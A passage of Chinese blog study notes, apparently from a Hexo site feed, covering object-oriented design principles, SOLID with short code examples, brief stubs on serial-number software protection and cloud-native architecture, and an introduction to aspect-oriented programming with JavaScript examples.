<li>聚合：在整体和部分之间定义一个弱「包含」关系。这种关系比较弱，因为部分可以在没有整体的时候存在。例如 HeroInventory（英雄财产）和 Item（条目）。HeroInventory 可以有很多 Items，而且一个 Items 也可以属于任何 HeroInventory（例如交易条目）。</li>
<li>组成：一个强「包含」关系，其中整体和部分不能彼此分离。部分不能被共享，因为整体要依赖于这些特定的部分。例如 Hero（英雄）和 HeroAttributes（英雄属性）。</li>
</ul>
<h3 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h3><p>泛化可能是最重要的设计原则，即我们提取共享特征，并将它们结合到一起的过程。我们都知道函数和类的继承，这就是一种泛化。</p>
<p>做一个比较可能会将这个解释得更加清楚：尽管抽象通过隐藏非必需的细节减少了复杂性，但是泛化通过用一个单独构造体来替代多个执行类似功能的实体。</p>
<p>在给出的例子中，我们将常用的 Hero 类和 NPC 类泛化为一个共同的父类 Entity，并通过继承简化子类的构建。</p>
<p>这里，我们通过将它们的共同功能移动到基本类中来减少复杂性，而不是让 NPC 类和 Hero 类将所有的功能都实现两次。</p>
<h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>组合就是把多个对象结合为一个更复杂对象的过程。这种方法会创建对象的示例，并且使用它们的功能，而不是直接继承它。</p>
<p>使用组合原则的对象就被称作组合对象（composite object）。这种组合对象在要比所有组成部分都简单，这是非常重要的一点。当把多个类结合成一个类的时候，我们希望把抽象的层次提高一些，让对象更加简单。</p>
<p>组合对象的 API 必须隐藏它的内部模块，以及内部模块之间的交互。就像一个机械时钟，它有三个展示时间的指针，以及一个设置时间的旋钮，但是它内部包含很多运动的独立部件。</p>
<p>正如我所说的，组合要优于继承，这意味着我们应该努力将共用功能移动到一个独立的对象中，然后其它类就使用这个对象的功能，而不是将它隐藏在所继承的基本类中。</p>
<h2 id="批判性思考"><a href="#批判性思考" class="headerlink" title="批判性思考"></a>批判性思考</h2><p>尽管这些设计原则是在数十年经验中形成的，但盲目地将这些原则应用到代码之前进行批判性思考是很重要的。</p>
<p>任何事情都是过犹不及！有时候这些原则可以走得很远，但是实际上有时会变成一些很难使用的东西。</p>
<p>作为一个工程师，我们需要根据独特的情境去批判地评价最好的方法，而不是盲目地遵从并应用任意的原则。</p>
<h2 id="关注点的内聚、耦合和分离"><a href="#关注点的内聚、耦合和分离" class="headerlink" title="关注点的内聚、耦合和分离"></a>关注点的内聚、耦合和分离</h2><h3 id="内聚（Cohesion）"><a href="#内聚（Cohesion）" class="headerlink" title="内聚（Cohesion）"></a>内聚（Cohesion）</h3><p>内聚代表的是模块内部责任的分明，或者是模块的复杂度。</p>
<p>如果我们的类只执行一个任务，而没有其它明确的目标，那么这个类就有着高度内聚性。另一方面，如果从某种程度而言它在做的事情并不清楚，或者具有多于一个的目标，那么它的内聚性就非常低。</p>
<p>我们希望代码具有较高的内聚性，如果发现它们有非常多的目标，或许我们应该将它们分割出来。</p>
<h3 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h3><p>耦合获取的是连接不同类的复杂度。我们希望类与其它的类具有尽可能少、尽可能简单的联系，所以我们就可以在未来的事件中交换它们（例如改变网络框架）。</p>
<p>在很多编程语言中，这都是通过大量使用接口来实现的，它们抽象出处理特定逻辑的类，然后表征为一种适配层，每个类都可以嵌入其中。</p>
<h3 id="分离关注点"><a href="#分离关注点" class="headerlink" title="分离关注点"></a>分离关注点</h3><p>分离关注点（SoC）是这样一种思想：软件系统必须被分割为功能上互不重叠的部分。或者说关注点必须分布在不同的地方，其中关注点表示能够为一个问题提供解决方案。</p>
<p>网页就是一个很好的例子，它具有三个层（信息层、表示层和行为层），这三个层被分为三个不同的地方（分别是 HTML，CSS，以及 JS）。</p>
<p>如果重新回顾一下我们的 RPG 例子，你会发现它在最开始具有很多关注点（应用 buffs 来计算袭击伤害、处理资产、装备条目，以及管理属性）。我们通过分解将那些关注点分割成更多的内聚类，它们抽象并封装了它们的细节。我们的 Hero 类现在仅仅作为一个组合对象，它比之前更加简单。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>对小规模的代码应用这些原则可能看起来很复杂。但是事实上，对于未来想要开发和维护的任何一个软件项目而言，这些规则都是必须的。在刚开始写这种代码会有些成本，但是从长期来看，它会回报以几倍增长。</p>
<p>这些原则保证我们的系统更加：</p>
<p>可扩展：高内聚使得不用关心不相关的功能就可以更容易地实现新模块。<br>可维护：低耦合保证一个模块的改变通常不会影响其它模块。高内聚保证一个系统需求的改变只需要更改尽可能少的类。<br>可重用：高内聚保证一个模块的功能是完整的，也是被妥善定义的。低耦合使得模块尽可能少地依赖系统的其它部分，这使得模块在其它软件中的重用变得更加容易。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/36330531" target="_blank" rel="noopener">如何写一手漂亮的模型：面向对象编程的设计原则综述</a>,by 机器之心.</li>
<li><a href="https://www.zhihu.com/question/24863332" target="_blank" rel="noopener">什么是面向切面编程AOP？</a>,by 知乎.</li>
<li><a href="https://blog.csdn.net/liuweitoo/article/details/8166503" target="_blank" rel="noopener">什么是面向方面编程</a>,by liuweitoo.</li>
<li><a href="https://blog.csdn.net/hguisu/article/details/7586704" target="_blank" rel="noopener">AOP面向方面编程</a>,by 规速.</li>
<li><a href="https://www.jianshu.com/p/a833d114099a" target="_blank" rel="noopener">团队开发框架实战—面向切面的编程 AOP</a>,by Bobby0322.</li>
<li><a href="https://blog.csdn.net/yanquan345/article/details/19760027" target="_blank" rel="noopener">轻松理解AOP(面向切面编程)</a>,by -望远-.</li>
<li><a href="https://github.com/android-cn/blog/tree/master/java/dependency-injection" target="_blank" rel="noopener">依赖注入</a>,by android-cn.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象设计的五大原则SOLID</title>
    <url>/2019/06/16/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E7%9A%84%E4%BA%94%E5%A4%A7%E5%8E%9F%E5%88%99SOLID/</url>
    <content><![CDATA[<p>在程序设计领域， SOLID（单一功能、开闭原则、里氏替换、接口隔离以及依赖反转）是由罗伯特·C·马丁在21世纪早期引入，指代了面向对象编程和面向对象设计的五个基本原则。</p>
<p>当这些原则被一起应用时，它们使得一个程序员开发一个容易进行软件维护和扩展的系统变得更加可能。 SOLID所包含的原则是通过引发编程者进行软件源代码的代码重构进行软件的代码异味清扫，从而使得软件清晰可读以及可扩展时可以应用的指南。</p>
<p>SOLID被典型的应用在测试驱动开发上，并且是敏捷开发以及自适应软件开发的基本原则的重要组成部分。</p>
<h1 id="SOLID原则简介"><a href="#SOLID原则简介" class="headerlink" title="SOLID原则简介"></a>SOLID原则简介</h1><table>
<thead>
<tr>
<th>首字母</th>
<th>指代</th>
<th>概念</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>单一功能原则</td>
<td>对象应该仅具有一种单一功能</td>
</tr>
<tr>
<td>O</td>
<td>开闭原则</td>
<td>软件体应该是对于扩展开放的，但是对于修改封闭的</td>
</tr>
<tr>
<td>L</td>
<td>里氏替换原则</td>
<td>程序中对象在不改变程序正确性的前提下被它的子类所替换</td>
</tr>
<tr>
<td>I</td>
<td>接口隔离原则</td>
<td>多个特定客户端接口要好于一个宽泛用途的接口</td>
</tr>
<tr>
<td>D</td>
<td>依赖反转原则</td>
<td>依赖于抽象而不是一个实例</td>
</tr>
</tbody></table>
<h1 id="单一功能原则"><a href="#单一功能原则" class="headerlink" title="单一功能原则"></a>单一功能原则</h1><p>在面向对象编程领域中，单一功能原则（Single responsibility principle）规定每个类都应该有一个单一的功能，并且该功能应该由这个类完全封装起来。所有它的（这个类的）服务都应该严密的和该功能平行（功能平行，意味着没有依赖）。</p>
<p>这个术语由罗伯特·C·马丁（Robert Cecil Martin）在他的《敏捷软件开发，原则，模式和实践》一书中的一篇名为〈面向对象设计原则〉的文章中给出。 马丁表述该原则是基于的《结构化分析和系统规格》一书中的内聚原则（Cohesion）上。</p>
<p>马丁把功能（职责）定义为：“改变的原因”，并且总结出一个类或者模块应该有且只有一个改变的原因。一个具体的例子就是，想象有一个用于编辑和打印报表的模块。这样的一个模块存在两个改变的原因。第一，报表的内容可以改变（编辑）。第二，报表的格式可以改变（打印）。这两方面会的改变因为完全不同的起因而发生：一个是本质的修改，一个是表面的修改。单一功能原则认为这两方面的问题事实上是两个分离的功能，因此他们应该分离在不同的类或者模块里。把有不同的改变原因的事物耦合在一起的设计是糟糕的。</p>
<p>保持一个类专注于单一功能点上的一个重要的原因是，它会使得类更加的健壮。继续上面的例子，如果有一个对于报表编辑流程的修改，那么将存在极大的危险性，因为假设这两个功能存在于同一个类中，修改报表的编辑流程会导致公共状态或者依赖关系的改变，打印功能的代码会因此不工作。</p>
<p><strong>单一职责原则可以参考数据库表的设计，SQL数据库中主从表设计成两个表就是遵循单一职责原则，而NoSQL数据库设计成一个对象则是违反单一职责原则。</strong></p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abstract class Employee &#123;</span><br><span class="line">  &#x2F;&#x2F; This needs to be implemented</span><br><span class="line">  abstract calculatePay (): number;</span><br><span class="line">  &#x2F;&#x2F; This needs to be implemented</span><br><span class="line">  abstract reportHours (): number;</span><br><span class="line">  &#x2F;&#x2F; let&#39;s assume THIS is going to be the </span><br><span class="line">  &#x2F;&#x2F; same algorithm for each employee- it can</span><br><span class="line">  &#x2F;&#x2F; be shared here.</span><br><span class="line">  protected save (): Promise&lt;any&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F; common save algorithm</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HR extends Employee &#123;</span><br><span class="line">  calculatePay (): number &#123;</span><br><span class="line">    &#x2F;&#x2F; implement own algorithm</span><br><span class="line">  &#125;</span><br><span class="line">  reportHours (): number &#123;</span><br><span class="line">    &#x2F;&#x2F; implement own algorithm</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Accounting extends Employee &#123;</span><br><span class="line">  calculatePay (): number &#123;</span><br><span class="line">    &#x2F;&#x2F; implement own algorithm</span><br><span class="line">  &#125;</span><br><span class="line">  reportHours (): number &#123;</span><br><span class="line">    &#x2F;&#x2F; implement own algorithm</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class IT extends Employee &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h1><p>在面向对象编程领域中，开闭原则规定“软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为。该特性在产品化的环境中是特别有价值的，在这种环境中，改变源代码需要代码审查，单元测试以及诸如此类的用以确保产品使用质量的过程。遵循这种原则的代码在扩展时并不发生改变，因此无需上述的过程。</p>
<p>开闭原则的命名被应用在两种方式上。这两种方式都使用了<strong>继承</strong>来解决明显的困境，但是它们的目的，技术以及结果是不同的。</p>
<p align="center">
    <img src="images/ocp-2.png" width="90%" alt="开闭原则示意图"/>
</p>
<center>图2  开闭原则示意图</center>

<p><strong>开闭原则主要利用面向对象的抽象父类和抽象函数。</strong></p>
<h1 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h1><p>在面向对象的程序设计中，里氏替换原则（Liskov Substitution principle）是对子类型的特别定义。它由芭芭拉·利斯科夫（Barbara Liskov）在1987年在一次会议上名为“数据的抽象与层次”的演说中首先提出。</p>
<p>里氏替换原则的内容可以描述为： “派生类（子类）对象可以在程式中代替其基类（超类）对象。”</p>
<p><strong>简单理解就是子类可以扩展父类的功能，但不要重写父类的方法，从而确保父子行为的一致性。</strong></p>
<h1 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h1><p>接口隔离原则（英语：interface-segregation principles， 缩写：ISP）指明客户（client）应该不依赖于它不使用的方法。接口隔离原则(ISP)拆分非常庞大臃肿的接口成为更小的和更具体的接口，这样客户将会只需要知道他们感兴趣的方法。这种缩小的接口也被称为角色接口（role interfaces）。接口隔离原则(ISP)的目的是系统解开耦合，从而容易重构，更改和重新部署。</p>
<p><strong>与类设计的单一职责原则类似，接口也要单一职责，不要太庞大。</strong></p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>以商家接入移动支付API的场景举例，支付宝支持收费和退费；微信接口只支持收费。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface PayChannel &#123;</span><br><span class="line">    void charge();</span><br><span class="line">    void refund();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AlipayChannel implements PayChannel &#123;</span><br><span class="line">    public void charge() &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void refund() &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WeChatChannel implements payChannel &#123;</span><br><span class="line">    public void charge() &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void refund() &#123;</span><br><span class="line">        &#x2F;&#x2F; 没有任何代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二种支付渠道，根本没有退款的功能，但是由于实现了PayChannel，又不得不将refund()实现成了空方法。那么，在调用中，这个方法是可以调用的，实际上什么都没有做!</p>
<p>将PayChannel拆成各包含一个方法的两个接口PayableChannel和RefundableChannel。</p>
<h1 id="依赖反转原则"><a href="#依赖反转原则" class="headerlink" title="依赖反转原则"></a>依赖反转原则</h1><p>在面向对象编程领域中，依赖反转原则（Dependency inversion principle，DIP）是指一种特定的解耦（传统的依赖关系创建在高层次上，而具体的策略设置则应用在低层次的模块上）形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。</p>
<p>该原则规定：</p>
<ul>
<li><strong>高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。</strong></li>
<li><strong>抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。</strong></li>
</ul>
<p><strong>注意：依赖反转原则重要的是利用高层抽象类，而不是底层实现类。</strong></p>
<p>该原则颠倒了一部分人对于面向对象设计的认识方式。如高层次和低层次对象都应该依赖于相同的抽象接口。</p>
<p align="center">
    <img src="images/Dependency_inversion.png" width="90%" alt="依赖反转原则示意图"/>
</p>
<center>左图中高层对象A依赖于底层对象B的实现；右图中把高层对象A对底层对象的需求抽象为一个接口A，底层对象B实现了接口A，这就是依赖反转。</center>
<center>图2  依赖反转原则示意图</center>

<p>在传统的应用架构中，低层次的组件设计用于被高层次的组件使用，这一点提供了逐步的构建一个复杂系统的可能。在这种结构下，高层次的组件直接依赖于低层次的组件去实现一些任务。这种对于低层次组件的依赖限制了高层次组件被重用的可行性。</p>
<p>依赖反转原则的目的是把高层次组件从对低层次组件的依赖中解耦出来，这样使得重用不同层级的组件实现变得可能。把高层组件和低层组件划分到不同的包/库（在这些包/库中拥有定义了高层组件所必须的行为和服务的接口，并且存在高层组件的包）中的方式促进了这种解耦。由于低层组件是对高层组件接口的具体实现，因此低层组件包的编译是依赖于高层组件的，这颠倒了传统的依赖关系。众多的设计模式，比如插件，服务定位器或者依赖反转，则被用来在运行时把指定的低层组件实现提供给高层组件。</p>
<p>应用依赖反转原则同样被认为是应用了适配器模式，例如：高层的类定义了它自己的适配器接口（高层类所依赖的抽象接口）。被适配的对象同样依赖于适配器接口的抽象（这是当然的，因为它实现了这个接口），同时它的实现则可以使用它自身所在低层模块的代码。通过这种方式，高层组件则不依赖于低层组件，因为它（高层组件）仅间接的通过调用适配器接口多态方法使用了低层组件，而这些多态方法则是由被适配对象以及它的低层模块所实现的。</p>
<h2 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PasswordReminder &#123;</span><br><span class="line">    private $dbConnection;</span><br><span class="line"> </span><br><span class="line">    public function __construct(MySQLConnection $dbConnection) &#123;</span><br><span class="line">        $this-&gt;dbConnection &#x3D; $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码存在问题：首先MySQLConnection是低层次模块，而PasswordReminder处于高层次，但根据S.O.L.I.D.中D的定义，即依赖抽象而不是具体实现，上面这段代码违反这一原则，PasswordReminder类被迫依赖于MySQLConnection类。</p>
<p>以后如果你改变数据库引擎，你还必须编辑PasswordReminder类，因此违反了开闭原则。</p>
<p>PasswordReminder类不应该关心你的应用程序使用什么数据库，为了解决这个问题我们又一次“对接口编程”，因为高层次和低层次模块应该依赖于抽象，我们可以创建一个接口:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface DBConnectionInterface &#123;</span><br><span class="line">    public function connect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口有一个connect方法，MySQLConnection类实现该接口，在PasswordReminder类的构造函数不使用MySQLConnection类，而是使用接口替换，不用管你的应用程序使用的是什么类型的数据库，PasswordReminder类可以很容易地连接到数据库，没有任何问题，且不违反OCP。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MySQLConnection implements DBConnectionInterface &#123;</span><br><span class="line">    public function connect() &#123;</span><br><span class="line">        return &quot;Database connection&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PasswordReminder &#123;</span><br><span class="line">    private $dbConnection;</span><br><span class="line"> </span><br><span class="line">    public function __construct(DBConnectionInterface $dbConnection) &#123;</span><br><span class="line">        $this-&gt;dbConnection &#x3D; $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面的代码片段，你现在可以看到，高层次和低层次模块依赖于抽象。</p>
<h1 id="迪米特法则"><a href="#迪米特法则" class="headerlink" title="迪米特法则"></a>迪米特法则</h1><p>迪米特法则是指软件实体间无需直接通信，那么就不应该发生直接调用，可以通过第三方间接通信。例如软件设计模式当中的门面模式，代理模式。</p>
<h1 id="合成复用原则"><a href="#合成复用原则" class="headerlink" title="合成复用原则"></a>合成复用原则</h1><p>合成复用原则是指面向对象设计过程中，尽量使用组合、聚合等关联关系实现，其次才考虑使用继承关系实现。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/wuyuegb2312/p/7011708.html" target="_blank" rel="noopener">面向对象的SOLID原则</a>,by wuyuegb2312.</li>
<li><a href="https://zh.wikipedia.org/wiki/SOLID_(%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1)" target="_blank" rel="noopener">SOLID (面向对象设计)</a>,by wikipedia.</li>
<li><a href="https://khalilstemmler.com/articles/solid-principles/solid-typescript/" target="_blank" rel="noopener">SOLID Principles: The Software Developer’s Framework to Robust &amp; Maintainable Code [with Examples]</a>,by Khalil Stemmler.</li>
<li><a href="http://blog.jobbole.com/86267/" target="_blank" rel="noopener">S.O.L.I.D：面向对象设计的头 5 大原则</a>,by 伯乐在线.</li>
<li><a href="https://www.bilibili.com/video/BV1GG4y1Q7Bd" target="_blank" rel="noopener">面向对象-软件设计原则-1小时搞懂-波波酱老师</a>,by 波波酱老师.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>采用序列号保护机制的软件保护技术</title>
    <url>/2021/01/16/%E9%87%87%E7%94%A8%E5%BA%8F%E5%88%97%E5%8F%B7%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>软件序列号保护是一种常用的软件保护机制，其具体流程如下图所示。</p>
<p align="center">
    <img src="images/softwarekey_fig1.gif" width="100%" alt="软件序列号保护流程"/>
</p>
<center>图1 软件序列号保护流程</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/30288807/" target="_blank" rel="noopener">加密与解密</a>,by 段钢.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21276527" target="_blank" rel="noopener">软件保护技术概述</a>,by wxam.</li>
<li><a href="https://blog.csdn.net/fuhanghang/article/details/84036545" target="_blank" rel="noopener">目前常见软件保护技术概述</a>,by 顺其自然~.</li>
<li><a href="https://www.codeproject.com/Articles/8902/A-simple-software-key-useful-to-protect-software-c" target="_blank" rel="noopener">A simple software key useful to protect software components</a>,by Manuele Sicuteri.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>云时代原生应用架构的思考</title>
    <url>/2020/02/28/%E4%BA%91%E6%97%B6%E4%BB%A3%E5%8E%9F%E7%94%9F%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/61901608" target="_blank" rel="noopener">什么是Service Mesh</a>,by Kenshin.</li>
<li><a href="https://jimmysong.io/migrating-to-cloud-native-application-architectures/" target="_blank" rel="noopener">迁移到云原生应用架构</a>,by Jimmy Song.</li>
<li><a href="https://jimmysong.io/kubernetes-handbook/" target="_blank" rel="noopener">Kubernetes中文指南/云原生应用架构实践手册</a>,by Jimmy Song.</li>
<li><a href="https://juejin.im/post/5d42945ff265da03a715b2f0" target="_blank" rel="noopener">Serverless（无服务）基础知识</a>,by 高露.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件架构</tag>
      </tags>
  </entry>
  <entry>
    <title>面向方面编程简介</title>
    <url>/2019/01/23/%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="什么是面向方面编程-What"><a href="#什么是面向方面编程-What" class="headerlink" title="什么是面向方面编程(What)"></a>什么是面向方面编程(What)</h1><p>面向侧面的程序设计（aspect-oriented programming，AOP，又译作面向方面的程序设计、观点导向编程、剖面导向程序设计）是计算机科学中的一个术语，指一种程序设计范型。该范型以一种称为侧面（aspect，又译作方面）的语言构造为基础，侧面是一种新的模块化机制，用来描述分散在对象、类或函数中的横切关注点（crosscutting concern）。</p>
<p>侧面的概念源于对面向对象的程序设计的改进，但并不只限于此，它还可以用来改进传统的函数。与侧面相关的编程概念还包括元对象协议、主题（subject）、混入（mixin）和委托。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
<li>关注点（concern）：对软件工程有意义的小的、可管理的、可描述的软件组成部分，一个关注点通常只同一个特定概念或目标相关联。</li>
<li>主关注点（core concern）：一个软件最主要的关注点。</li>
<li>关注点分离（separation of concerns，SOC）：标识、封装和操纵只与特定概念、目标相关联的软件组成部分的能力，即标识、封装和操纵关注点的能力。</li>
<li>方法（method）：用来描述、设计、实现一个给定关注点的软件构造单位。</li>
<li>横切（crosscut）：两个关注点相互横切，如果实现它们的方法存在交集。</li>
<li>支配性分解（dominant decomposition）：将软件分解成模块的主要方式。传统的程序设计语言是以一种线性的文本来描述软件的，只采用一种方式（比如：类）将软件分解成模块；这导致某些关注点比较好的被捕捉，容易进一步组合、扩展；但还有一些关注点没有被捕捉，弥散在整个软件内部。支配性分解一般是按主关注点进行模块分解的。</li>
<li>横切关注点（crosscutting concerns）：在传统的程序设计语言中，除了主关注点可以被支配性分解方式捕捉以外，还有许多没有被支配性分解方式捕捉到的关注点，这些关注点的实现会弥散在整个软件内部，这时这些关注点同主关注点是横切的。</li>
<li>侧面（aspect）：在支配性分解的基础上，提供的一种辅助的模块化机制，这种新的模块化机制可以捕捉横切关注点。</li>
</ul>
<p>从<strong>主关注点</strong>中分离出横切关注点是面向侧面的程序设计的核心概念。<strong>分离关注点</strong>使得解决特定领域问题的代码从业务逻辑中独立出来，业务逻辑的代码中不再含有针对特定领域问题代码的调用，业务逻辑同特定领域问题的关系通过<strong>侧面</strong>来封装、维护，这样原本分散在在整个应用程序中的变动就可以很好的管理起来。</p>
<p>对于一个信用卡应用程序来说，存款、取款、帐单管理是它的主关注点，日志和持久化将成为横切整个对象结构的横切关注点。</p>
<h1 id="为什么需要面向方面编程-Why"><a href="#为什么需要面向方面编程-Why" class="headerlink" title="为什么需要面向方面编程(Why)"></a>为什么需要面向方面编程(Why)</h1><p>AOP技术的优势是显而易见的。在面向对象的世界里，人们提出了各种方法和设计原则来保障系统的可复用性与可扩展性，以期建立一个松散耦合、便于扩展的软件系统。例如GOF提出的“设计模式”，为我们提供了设计的典范与准则。设计模式通过最大程度的利用面向对象的特性，诸如利用继承、多态，对责任进行分离、对依赖进行倒置，面向抽象，面向接口，最终设计出灵活、可扩展、可重用的类库、组件，乃至于整个系统的架构。在设计的过程中，通过各种模式体现对象的行为、暴露的接口、对象间关系、以及对象分别在不同层次中表现出来的形态。然而鉴于对象封装的特殊性，“设计模式”的触角始终在接口与抽象中大做文章，而对于对象内部则无能为力。</p>
<p>通过“横切”技术，AOP技术就能深入到对象内部翻云覆雨，截取方法之间传递的消息为我所用。由于将核心关注点与横切关注点完全隔离，使得我们能够独立的对“方面”编程。它允许开发者动态地修改静态的OO模型，构造出一个能够不断增长以满足新增需求的系统，就象现实世界中的对象会在其生命周期中不断改变自身，应用程序也可以在发展中拥有新的功能。</p>
<p>设计软件系统时应用AOP技术，其优势在于：</p>
<ul>
<li>在定义应用程序对某种服务（例如日志）的所有需求的时候。通过识别关注点，使得该服务能够被更好的定义，更好的被编写代码，并获得更多的功能。这种方式还能够处理在代码涉及到多个功能的时候所出现的问题，例如改变某一个功能可能会影响到其它的功能，在AOP中把这样的麻烦称之为“纠结（tangling）”。</li>
<li>利用AOP技术对离散的方面进行的分析将有助于为开发团队指定一位精于该项工作的专家。负责这项工作的最佳人选将可以有效利用自己的相关技能和经验。</li>
<li>持久性。标准的面向对象的项目开发中，不同的开发人员通常会为某项服务编写相同的代码，例如日志记录。随后他们会在自己的实施中分别对日志进行处理以满足不同单个对象的需求。而通过创建一段单独的代码片段，AOP提供了解决这一问题的持久简单的方案，这一方案强调了未来功能的重用性和易维护性：不需要在整个应用程序中一遍遍重新编写日志代码，AOP使得仅仅编写日志方面（logging aspect）成为可能，并且可以在这之上为整个应用程序提供新的功能。</li>
</ul>
<p>总而言之，AOP技术的优势使得需要编写的代码量大大缩减，节省了时间，控制了开发成本。同时也使得开发人员可以集中关注于系统的核心商业逻辑。此外，它更利于创建松散耦合、可复用与可扩展的大型软件系统。</p>
<h1 id="如何实现面向方面编程-How"><a href="#如何实现面向方面编程-How" class="headerlink" title="如何实现面向方面编程(How)"></a>如何实现面向方面编程(How)</h1><p>使用js实现before（前置通知）、after（后置通知）、around（环绕通知）。</p>
<h2 id="before（前置通知）"><a href="#before（前置通知）" class="headerlink" title="before（前置通知）"></a>before（前置通知）</h2><p>before函数，用来实现函数的前置通知。在目标函数的前面执行一些前置操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 前置通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 给方法加入前置切片函数</span><br><span class="line"> * 可以在执行方法之前执行一些操作,</span><br><span class="line"> * 前置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被前置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入前置通知的函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._before &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return __self.apply(__self, arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line">function a()&#123;</span><br><span class="line">    console.log(&#39;I\&#39;m a&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a &#x3D; a._before(function()&#123;</span><br><span class="line">    console.log(&#39;before&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line">&#x2F;&#x2F; 结果：</span><br><span class="line">&#x2F;&#x2F; before</span><br><span class="line">&#x2F;&#x2F; I&#39;m a</span><br></pre></td></tr></table></figure>

<h2 id="after（后置通知）"><a href="#after（后置通知）" class="headerlink" title="after（后置通知）"></a>after（后置通知）</h2><p>after函数，用来实现函数的后置通知。在目标函数的后面面执行一些后置操作。</p>
